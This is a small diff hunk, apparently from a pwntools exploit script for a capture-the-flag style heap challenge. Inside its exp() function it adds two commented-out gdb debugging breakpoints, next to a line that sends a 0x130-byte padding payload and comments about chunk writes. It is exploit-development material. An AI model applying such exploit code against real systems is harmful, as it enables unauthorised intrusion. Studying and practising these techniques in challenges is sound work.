@@ -137,6 +137,8 @@ def exp():
     ## continue write chunk_1
     #gdb.attach(p, "b *0x0000555555554000+0x1db2f\nc\n")
     r8.send(b"D"*0x130)
+    #gdb.attach(p, "b *0x0000555555554000+0x9d05\nc\n")
+    #gdb.attach(p)
     
     ## there will be a loop chain (magic...)
     
